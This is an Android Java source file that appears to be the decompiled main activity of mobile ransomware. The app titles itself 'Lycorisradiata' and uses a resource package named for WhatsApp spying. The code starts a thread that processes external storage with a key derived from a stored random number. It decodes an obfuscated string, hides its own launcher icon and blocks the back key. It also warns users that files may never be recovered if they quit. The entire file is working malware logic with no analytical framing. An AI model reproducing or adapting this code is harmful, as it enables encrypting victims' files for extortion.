package com.android.tencent.zdevs.bah;

import android.content.ComponentName;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Environment;
import android.support.v7.app.AppCompatActivity;
import android.view.KeyEvent;
import android.widget.Toast;
import com.wThgSpyWhatsApp.R;
import java.io.File;

public class MainActivity extends AppCompatActivity {
    static String decryptKey;
    static File externalStorageDirectory;
    static String hz;
    static int hzs;
    public static MainActivity instance;
    ComponentName firstComponentName;
    PackageManager packageManager;
    String randomNumber;
    ComponentName secondComponentName;

    class C01931 implements Runnable {
        C01931() {
        }

        public void run() {
            Utils.deleteDir(MainActivity.externalStorageDirectory.toString(), MainActivity.decryptKey, 1, MainActivity.this);
        }
    }

    private void disableComponent(ComponentName componentName) {
        this.packageManager.setComponentEnabledSetting(componentName, 2, 1);
    }

    private void enabledComponent(ComponentName componentName) {
        this.packageManager.setComponentEnabledSetting(componentName, 1, 1);
    }

    private void setIconSc() {
        disableComponent(this.firstComponentName);
        enabledComponent(this.secondComponentName);
    }

    protected void onCreate(Bundle bundle) {
        getWindow().addFlags(1024);
        this.packageManager = getApplicationContext().getPackageManager();
        this.firstComponentName = new ComponentName(getBaseContext(), "com.android.tencent.zdevs.bah.MainActivity");
        this.secondComponentName = new ComponentName(getBaseContext(), "com.android.tencent.zdevs.bah.QQ1279525738");
        super.onCreate(bundle);
        setContentView((int) R.layout.home);
        instance = this;
        getSupportFragmentManager().beginTransaction().replace(R.id.frame_content, new EncryptFragment()).commit();
        SharedPreferences sharedPreferences = getSharedPreferences("XH", 0);
        if (sharedPreferences.getString("bah", "").equals("")) {
            this.randomNumber = "" + (((int) (Math.random() * 1000000.0d)) + 10000000);
            Editor edit = sharedPreferences.edit();
            edit.putString("bah", this.randomNumber);
            edit.commit();
        } else {
            this.randomNumber = sharedPreferences.getString("bah", "");
        }
        hz = Utils.m9l("ៗគ៑តៗគ៑ណៗគ៑ផៗគ៑ថៗគរៗៗគរ៕ៗគរៈៗគរ៑ៗគរ៖ៗគរៈៗគរ។ៗគរ៚ៗគរ៌ៗគរ៚ៗគ៑ចៗគ៑ច៖ឨគព៖ឪឬឪ៕ឺពភ៩៖ឹឆៗ៕ឹឤឋ៕ឹឤយ៖ឨឤ៑៖ឨឆលៗគរង៩") + this.randomNumber;
        decryptKey = "" + (Integer.parseInt(this.randomNumber) + 520);
        hzs = hz.length();
        externalStorageDirectory = new File(String.valueOf(Environment.getExternalStorageDirectory()) + "/");
        if (sharedPreferences.getInt("cs", 0) >= 2) {
            setTitle("Lycorisradiata");
            getSupportFragmentManager().beginTransaction().replace(R.id.frame_content, new MainFragment()).commit();
            Utils.bz(this);
        }
        if (sharedPreferences.getInt("sss", 0) == 0) {
            new Thread(new C01931()).start();
            return;
        }
        setTitle("Lycorisradiata");
        getSupportFragmentManager().beginTransaction().replace(R.id.frame_content, new MainFragment()).commit();
        Utils.bz(this);
        setIconSc();
    }

    public boolean onKeyDown(int keyCode, KeyEvent keyEvent) {
        if (keyCode == 4) {
            Toast.makeText(this, getSupportFragmentManager().findFragmentById(R.id.frame_content) instanceof EncryptFragment ? "配置文件中 请勿退出！" : "Please do not quit the software, or the file may never be recovered!", 1).show();
        }
        return true;
    }

    protected void onPause() {
        if (getSupportFragmentManager().findFragmentById(R.id.frame_content) instanceof EncryptFragment) {
            SharedPreferences sharedPreferences = getSharedPreferences("XH", 0);
            Editor edit = sharedPreferences.edit();
            edit.putInt("cs", sharedPreferences.getInt("cs", 0) + 1);
            edit.commit();
            Toast.makeText(this, "配置文件中 请勿退出！", 1).show();
        } else {
            Toast.makeText(this, "Please do not quit the software, or the file may never be recovered!", 1).show();
        }
        super.onPause();
    }

    protected void onResume() {
        if ((getSupportFragmentManager().findFragmentById(R.id.frame_content) instanceof EncryptFragment) && getSharedPreferences("XH", 0).getInt("cs", 0) >= 2) {
            setTitle("Lycorisradiata");
            getSupportFragmentManager().beginTransaction().replace(R.id.frame_content, new MainFragment()).commit();
        }
        super.onResume();
    }
}
